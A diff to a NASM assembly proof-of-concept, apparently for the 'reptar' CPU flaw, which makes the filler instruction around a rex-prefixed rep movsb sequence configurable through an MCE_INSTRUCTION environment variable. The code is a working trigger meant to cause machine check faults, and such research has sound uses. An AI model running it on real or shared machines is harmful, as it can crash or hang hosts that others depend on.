@@ -1,5 +1,11 @@
 BITS 64
 
+%define MCE_INSTRUCTION pause
+; Define MCE_INSTRUCTION as an env var
+%ifenv %!MCE_INSTRUCTION
+    %define MCE_INSTRUCTION %!MCE_INSTRUCTION
+%endif
+
 global _start
 
 section .text
@@ -7,7 +13,7 @@ section .text
         lea rsi, [rsp+1]
         mov rdi, rsi
         align 0x1000
-        times 8*64*64 pause
+        times 8*64*64 MCE_INSTRUCTION
         .many_reptars:
         %rep 64*8 ; icache has 8 ways 64 sets
             clflush [rdi-1] ; 4uops     ; 4 bytes
@@ -20,8 +26,7 @@ section .text
             rep
             db 0x44; rex.r
             movsb           ; msrom ptr ; 3 bytes
-            pause           ; 1uop      ; 2 bytes
-            pause           ; 1uop      ; 2 bytes
+            MCE_INSTRUCTION
             align 64 ; icache line size
         %endrep
-        times 8*64*64*100 pause
+        times 8*64*64*100 MCE_INSTRUCTION
